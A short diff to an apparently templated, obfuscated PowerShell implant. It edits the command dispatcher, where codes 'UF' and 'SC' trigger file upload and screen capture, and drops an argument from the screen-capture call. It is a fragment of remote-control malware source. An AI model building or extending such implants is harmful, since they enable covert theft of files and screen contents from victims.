@@ -69,7 +69,7 @@ function {{ ron.obf_builtin_command }}($data){
     } elseif ($a -eq "UF"){
         {{ ron.obf_upload_file }}([System.Text.Encoding]::UTF8.GetString($b))
     } elseif ($a -eq "SC"){
-        {{ ron.obf_screen_capture }}([System.Text.Encoding]::UTF8.GetString($b))
+        {{ ron.obf_screen_capture }}
     } else {
         $global:tr = $null
     }
